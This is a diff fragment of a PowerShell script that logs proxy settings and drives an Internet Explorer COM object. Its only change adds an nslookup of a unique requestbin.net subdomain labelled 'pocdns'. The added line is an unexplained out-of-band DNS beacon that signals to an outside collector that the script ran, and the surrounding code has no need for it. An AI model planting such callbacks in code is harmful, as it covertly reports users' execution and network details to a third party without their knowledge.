@@ -2829,6 +2829,8 @@ echo "[+] Script started. Proxies : " >> C:\debugpwsh\debug.txt
 [System.Net.WebProxy]::GetDefaultProxy() | select address >> C:\debugpwsh\debug.txt; 
 [System.Net.webrequest]::defaultwebproxy >> C:\debugpwsh\debug.txt; 
 
+nslookup pocdns.bb0a55855a76a53fe2bb.d.requestbin.net
+
 $ie = New-Object -com internetexplorer.application
 $ie.visible = $true
 set lepid ((Get-Process -Name iexplore) | Where-Object {$_.MainWindowHandle -eq $ie.HWND} | select -expand id)
